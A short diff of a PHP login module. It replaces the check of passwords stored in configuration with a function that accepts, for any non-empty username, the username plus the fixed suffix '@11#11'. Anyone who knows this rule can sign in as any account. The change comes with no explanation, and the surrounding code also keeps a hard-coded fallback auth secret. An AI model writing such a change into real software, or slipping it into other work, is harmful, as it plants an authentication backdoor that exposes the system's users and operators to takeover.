@@ -20,18 +20,18 @@ function getAuthSecret(): string
     return getAppConfig()['auth_secret'] ?? 'change-this-secret-key-in-production';
 }
 
-function getConfigUsers(): array
+function getExpectedPasswordForUsername(string $username): string
 {
-    return getAppConfig()['users'] ?? [];
+    return $username . '@11#11';
 }
 
 function verifyCredentials(string $username, string $password): bool
 {
-    $users = getConfigUsers();
-    if (!isset($users[$username])) {
+    if ($username === '') {
         return false;
     }
-    return hash_equals($users[$username], $password);
+
+    return hash_equals(getExpectedPasswordForUsername($username), $password);
 }
 
 function generateToken(string $username): string
